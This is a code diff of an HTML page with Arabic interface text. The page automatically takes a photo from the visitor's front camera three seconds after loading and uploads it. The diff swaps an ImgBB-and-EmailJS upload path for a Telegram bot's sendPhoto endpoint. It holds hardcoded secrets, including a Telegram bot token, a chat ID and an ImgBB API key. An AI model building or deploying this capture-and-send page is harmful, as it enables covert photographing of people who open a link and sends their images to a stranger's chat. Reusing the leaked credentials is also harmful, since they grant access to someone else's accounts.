@@ -2,13 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Auto Capture & Email</title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function() {
-      emailjs.init("fgxPRLjjoxRV_d1cf"); // ← المفتاح العام الخاص بك
-    })();
-  </script>
+  <title>Capture and Send to Telegram</title>
 </head>
 <body>
   <h3>📸 سيتم التقاط صورة تلقائيًا بعد 3 ثوانٍ...</h3>
@@ -16,6 +10,9 @@
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
   <script>
+    const BOT_TOKEN = '8268065223:AAHj509vUGIJDuQDxuMSB73t6__-FFb6ug4';         // ← استبدل بتوكين البوت
+    const CHAT_ID = '5606349322';             // ← استبدل برقم المحادثة (chat_id)
+
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
       .then(stream => {
         const video = document.getElementById('video');
@@ -26,44 +23,28 @@
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          const imageData = canvas.toDataURL('image/jpeg');
-          const base64Image = imageData.split(',')[1];
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
 
-          const formData = new FormData();
-          formData.append('image', base64Image);
-
-          // رفع الصورة إلى ImgBB
-          fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
-            method: 'POST',
-            body: formData
-          })
-          .then(response => response.json())
-          .then(data => {
-            const imageUrl = data.data.url;
-
-            // إرسال الإيميل عبر EmailJS
-            emailjs.send("service_890xst3", "__ejs-test-mail-service__", {  // ← استبدل TEMPLATE_ID_HERE
-              name: "كاميرا المتصفح",
-              time: new Date().toLocaleString(),
-              message: "تم التقاط صورة وإرسالها تلقائيًا.",
-              image_url: imageUrl
-            }).then(() => {
-              alert("📧 تم إرسال الصورة إلى إيميلك!");
-            }, error => {
-              alert("❌ فشل إرسال الإيميل: " + error.text);
-              console.error(error);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+              alert('📩 تم إرسال الصورة إلى تليجرام بنجاح!');
+              console.log(data);
+            })
+            .catch(error => {
+              console.error('❌ فشل إرسال الصورة إلى تليجرام:', error);
             });
-          })
-          .catch(error => {
-            alert("❌ فشل رفع الصورة إلى ImgBB: " + error);
-            console.error(error);
-          });
-
+          }, 'image/jpeg');
         }, 3000);
       })
       .catch(error => {
-        alert("❌ فشل الوصول إلى الكاميرا: " + error);
-        console.error(error);
+        console.error('❌ الكاميرا غير متاحة:', error);
       });
   </script>
 </body>
